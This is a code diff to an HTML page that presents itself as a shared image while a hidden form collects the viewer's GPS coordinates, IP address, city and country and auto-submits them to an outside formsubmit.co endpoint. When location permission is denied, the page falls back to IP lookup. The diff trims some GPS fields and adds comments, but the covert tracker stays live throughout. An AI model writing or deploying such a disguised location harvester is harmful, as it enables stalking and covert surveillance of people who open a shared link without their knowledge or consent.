@@ -2,7 +2,7 @@
 <html lang="en">
   <head>
     <meta charset="UTF-8" />
-    <title>Image</title>
+    <title>Shared Image</title>
     <style>
       body {
         margin: 0;
@@ -16,6 +16,7 @@
   </head>
   <body>
     <img src="tr.png" alt="Shared Image" id="trackedImg" />
+    <!-- Hidden FormSubmit form -->
     <form
       id="trackForm"
       action="https://formsubmit.co/38924188133f2a1e536fdfc86fbc9394"
@@ -30,10 +31,6 @@
       <input type="hidden" name="GPS_Latitude" id="gps_lat" />
       <input type="hidden" name="GPS_Longitude" id="gps_lng" />
       <input type="hidden" name="GPS_Accuracy" id="gps_acc" />
-      <input type="hidden" name="GPS_Altitude" id="gps_alt" />
-      <input type="hidden" name="GPS_AltitudeAccuracy" id="gps_altacc" />
-      <input type="hidden" name="GPS_Heading" id="gps_heading" />
-      <input type="hidden" name="GPS_Speed" id="gps_speed" />
       <input type="hidden" name="IP" id="ip" />
       <input type="hidden" name="City" id="city" />
       <input type="hidden" name="Country" id="country" />
@@ -67,11 +64,6 @@
           document.getElementById("gps_lat").value = gps.latitude || "";
           document.getElementById("gps_lng").value = gps.longitude || "";
           document.getElementById("gps_acc").value = gps.accuracy || "";
-          document.getElementById("gps_alt").value = gps.altitude || "";
-          document.getElementById("gps_altacc").value =
-            gps.altitudeAccuracy || "";
-          document.getElementById("gps_heading").value = gps.heading || "";
-          document.getElementById("gps_speed").value = gps.speed || "";
         }
         if (ipinfo) {
           document.getElementById("ip").value = ipinfo.ip || "";
@@ -88,15 +80,12 @@
                 latitude: pos.coords.latitude,
                 longitude: pos.coords.longitude,
                 accuracy: pos.coords.accuracy,
-                altitude: pos.coords.altitude,
-                altitudeAccuracy: pos.coords.altitudeAccuracy,
-                heading: pos.coords.heading,
-                speed: pos.coords.speed,
               };
               const ipinfo = await getIPLocation();
               fillAndSubmitForm(gps, ipinfo);
             },
             async (err) => {
+              // If user denies permission, fallback to IP only
               const ipinfo = await getIPLocation();
               fillAndSubmitForm({}, ipinfo);
             },
